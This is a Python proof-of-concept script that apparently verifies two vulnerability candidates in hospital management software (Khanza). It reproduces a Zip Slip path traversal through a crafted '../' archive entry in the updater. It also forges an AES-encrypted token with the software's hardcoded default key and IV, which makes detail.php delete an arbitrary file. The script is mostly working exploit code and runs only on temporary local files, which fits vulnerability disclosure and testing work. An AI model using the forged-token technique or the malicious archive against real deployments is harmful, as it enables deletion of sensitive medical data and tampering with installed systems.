import os
import json
import base64
import hashlib
import zipfile
import tempfile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

key = b"Bar12345Bar12345"
iv  = b"sayangsamakhanza"

print("==========================================================")
print("  CVE PROOF OF CONCEPT (LOCAL VERIFICATION)")
print("==========================================================")

# ---------------------------------------------------------
# CVE Candidate 1: Zip Slip Path Traversal (CWE-22)
# File target: KhanzaUpdater/src/update/Main_Gui.java:208
# ---------------------------------------------------------
print("\n[CVE-1] Pengujian Zip Slip (KhanzaUpdater/src/update/Main_Gui.java)")
with tempfile.TemporaryDirectory() as temp_dir:
    app_root = os.path.join(temp_dir, "khanza_app")
    update_dir = os.path.join(app_root, "update")
    os.makedirs(update_dir, exist_ok=True)
    
    target_file = os.path.join(app_root, "critical_config.sys")
    with open(target_file, "w") as f:
        f.write("ORIGINAL_CLEAN_DATA")
    
    zip_path = os.path.join(temp_dir, "dataupdate.zip")
    with zipfile.ZipFile(zip_path, "w") as z:
        z.writestr("../critical_config.sys", "OVERWRITTEN_BY_EXPLOIT")
        
    # Replikasi baris 208-219 Main_Gui.java
    root = update_dir + os.sep
    with zipfile.ZipFile(zip_path, "r") as z:
        for entry in z.infolist():
            dest_path = root + entry.filename
            with open(dest_path, "wb") as f:
                f.write(z.read(entry))
                
    with open(target_file, "r") as f:
        content = f.read()
        
    print(f"Target File : {target_file}")
    print(f"Isi Akhir   : {content}")
    print(f"Status      : {'BERHASIL DIEKSPLOITASI (Zip Slip terbukti)' if content == 'OVERWRITTEN_BY_EXPLOIT' else 'GAGAL'}")

# ---------------------------------------------------------
# CVE Candidate 2: Arbitrary File Deletion (CWE-73 / CWE-321)
# File target: webapps/berkasrawat/pages/detail.php:199
# ---------------------------------------------------------
print("\n[CVE-2] Pengujian Arbitrary File Deletion (webapps/berkasrawat/pages/detail.php)")
with tempfile.TemporaryDirectory() as temp_dir:
    victim_file = os.path.join(temp_dir, "database_backup.sql")
    with open(victim_file, "w") as f:
        f.write("SENSITIVE_MEDICAL_DATABASE")
        
    # Buat payload token forged
    payload = json.dumps({
        "no_rawat": "2026/01/01/000001",
        "kode": "001",
        "lokasi_file": victim_file
    })
    
    sha_k = hashlib.sha256(key).digest()
    sha_iv = hashlib.sha256(iv).digest()[:16]
    
    p = padding.PKCS7(128).padder()
    padded = p.update(payload.encode('utf-8')) + p.finalize()
    c = Cipher(algorithms.AES(sha_k), modes.CBC(sha_iv)).encryptor()
    token = base64.b64encode(c.update(padded) + c.finalize()).decode('utf-8')
    
    # Replikasi detail.php:15 & 199
    # 1. Dekripsi token menggunakan key bawaan
    raw = base64.b64decode(token)
    dec = Cipher(algorithms.AES(sha_k), modes.CBC(sha_iv)).decryptor()
    padded_dec = dec.update(raw) + dec.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    decrypted_json = json.loads((unpadder.update(padded_dec) + unpadder.finalize()).decode('utf-8'))
    
    # 2. Eksekusi unlink($norawat["lokasi_file"])
    target_delete = decrypted_json["lokasi_file"]
    if os.path.exists(target_delete):
        os.remove(target_delete)
        
    print(f"File Korban : {victim_file}")
    print(f"Token Forged: {token}")
    print(f"Status      : {'BERHASIL DIHAPUS (Arbitrary File Deletion terbukti)' if not os.path.exists(victim_file) else 'GAGAL'}")

print("\n==========================================================")
